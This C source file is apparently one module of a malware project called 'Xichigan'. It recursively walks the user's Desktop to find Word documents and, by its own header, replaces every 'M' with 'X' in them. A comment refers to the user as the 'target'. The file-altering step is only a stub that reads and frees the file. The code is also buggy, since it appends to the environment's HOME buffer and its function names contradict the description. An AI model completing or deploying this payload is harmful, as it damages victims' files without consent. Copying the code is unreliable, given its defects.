#include "Xichigan.h"
#define PATH_MAX        4096    /* # chars in a path name including nul */

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* Called from: main.c										 					 					*
*																				 							*
* Functions to search for .doc and .docx files on the desktop                    *
* of the current user, open them, and replace every ‘M’ or ‘m’ with ‘X’          *
**********************************************************************************/

/*********************************************************************************
Open the .docx or .doc file and replace 'M' and 'm' with 'X'
**********************************************************************************/
void convertXtoM(char *filepath){
	//int c;
	FILE *file;
	char *buffer;
	unsigned long fileLen;

	// Open the file
	file = fopen(filepath, "rb");
	if (!file){
		//fprintf(stderr, "Unable to open file %s", filepath);
		return; // Return with no error to target
	}
	
	// Get file length
	fseek(file, 0, SEEK_END);
	fileLen=ftell(file);
	fseek(file, 0, SEEK_SET);

	// Allocate memory for the buffer
	buffer=(char *)malloc(fileLen+1);
	if (!buffer){
      fclose(file);
		return;
	}

	// Read file contents into the buffer
	fread(buffer, fileLen, 1, file);
	fclose(file);

	/* For testing purposes */
	// Print out the first 1000 bytes of data in Hex
	/*for (c=0;c<1000;c++)
	{
		printf("%.2X ", (int)buffer[c]);

		// Put an extra space between every 4 bytes
		if (c % 4 == 3)
		{
			printf(" ");
		}

		// Display 16 bytes per line
		if (c % 16 == 15)
		{
			printf("\n");
		}
	}*/

	free(buffer);

}

/*********************************************************************************
Determine if the filepath 'path' is a directory; return 1 if it is a directory, 
0 otherwise
**********************************************************************************/
int isDir(const char* path) {
    struct stat buf;
    stat(path, &buf);
    return S_ISDIR(buf.st_mode);
}

/*********************************************************************************
Search (spider) through all of the files on the Desktop and any subdirectories
**********************************************************************************/
void spiderDirectory(char *homeDir, DIR *d){
	struct dirent *dir;
	DIR *currentD;
	char *currentDir = malloc(PATH_MAX);
	int length;

	// Loop and recurse until there are no more subdirectories
	while ((dir = readdir(d)) != NULL){
		// Get the full path associated with dir->d_name
		strcpy(currentDir, homeDir);
		strcat(currentDir,"/");
		strcat(currentDir,dir->d_name);
		
		// If the current element of the directory is a subdirectory (and not . or ..), spider through it
		if(strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && isDir(currentDir)){
			currentD = opendir(currentDir);
			if (currentD){
				spiderDirectory(currentDir, currentD);
				closedir(currentD);
			}
		}

		// If the current item in the directory is a .doc, or .docx, run X to M on it
		length = strlen(currentDir);
		if(length > 4 && (strcmp(&currentDir[length-5],".docx") == 0 || strcmp(&currentDir[length-4],".doc") == 0)){
			convertXtoM(currentDir);
		}
	}

}

/*********************************************************************************
Main Function
**********************************************************************************/
void* XtoM(void* param) {
	DIR *d;
	char *homedir = getenv("HOME");

	// Get the Desktop path if user is using Linux
	strcat(homedir,"/Desktop");

	// TODO: Get Desktop path if user is using Windows/iOS

	// Look through the desktop and all of its subdirectories for word documents, and do the conversion XtoM
	d = opendir(homedir);
	if (d){
		spiderDirectory(homedir, d);
		closedir(d);
	}

	return NULL;
}

